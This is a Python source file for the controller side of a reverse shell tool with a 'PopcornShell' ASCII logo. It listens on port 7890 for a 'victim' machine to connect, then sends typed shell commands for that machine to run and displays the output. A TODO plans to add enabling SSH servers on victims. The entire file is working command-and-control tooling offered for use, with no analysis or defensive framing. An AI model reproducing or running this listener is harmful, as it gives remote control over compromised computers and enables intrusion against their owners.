import sys
from command_payload import CommandPayload
from command_payload import parse_payload_to_output
from secure_socket import SecureSocket

# Port listening for the victim's connection
port = 7890

# Style out prompt and output
output_style = "full"
exit_flag = False


# Custom command behaviour
# Todo: generate command to enable ssh server for windows 10 and linux
def parse_custom_command(cmd: str) -> str:
    global output_style
    global exit_flag
    if cmd == "help":
        show_help()
    elif cmd == "exit":
        print("Exiting")
        exit_flag = True
        return "-> exit"
    elif cmd == "simple":
        output_style = "simple"
    elif cmd == "full":
        output_style = "full"
    return ""


# Create the server socket that await the victim to connect to
def create_socket():
    global output_style
    global exit_flag

    secure_socket = SecureSocket()
    secure_socket.wait_for_connection()

    # Receive data from the client
    while True:
        prompt = "Send command (type \"-> help\" to help): " if output_style == "full" else ">"
        command = input(prompt)

        # Parse custom commands
        if command.split(" ")[0] == "->":
            custom_command = command.split(" ")[1]
            command = parse_custom_command(custom_command)

        # Skip empty command
        if len(command) == 0:
            continue

        # Send command
        payload = CommandPayload(command=command)
        packet = payload.pack()
        if not secure_socket.send(packet):
            print("Resetting connection")
            create_socket()

        if exit_flag:
            secure_socket.close()
            exit(0)

        # Receive result
        payload = secure_socket.receive(parse_payload_to_output)
        if type(payload) is not CommandPayload:
            if len(payload) == 0:
                print("Connection lost")
                secure_socket.close()
                create_socket()
            else:
                continue

        print(payload.formatted_output(output_style))


def show_logo():
    content = '''
███████████████████████████████████████████████████████████████████████
█▄─▄▄─█─▄▄─█▄─▄▄─█─▄▄▄─█─▄▄─█▄─▄▄▀█▄─▀█▄─▄█─▄▄▄▄█─█─█▄─▄▄─█▄─▄███▄─▄███
██─▄▄▄█─██─██─▄▄▄█─███▀█─██─██─▄─▄██─█▄▀─██▄▄▄▄─█─▄─██─▄█▀██─██▀██─██▀█
▀▄▄▄▀▀▀▄▄▄▄▀▄▄▄▀▀▀▄▄▄▄▄▀▄▄▄▄▀▄▄▀▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀
'''
    print(content)


def show_help():
    content = '''
Help menu
This is the server script that awaits a victim to connect to
Once connected, you can send shell command for the victim to execute

=========== Custom commands ==========
+-------------+----------------------+
| -> help     | - to see this page   |
| -> exit     | - to exit shell      |
| -> simple   | - to simplify output |
| -> full     | - to use full output |
+-------------+----------------------+
'''
    print(content)


def main():
    show_logo()
    if len(sys.argv) > 1:
        show_help()
        exit(0)
    create_socket()


if __name__ == '__main__':
    main()
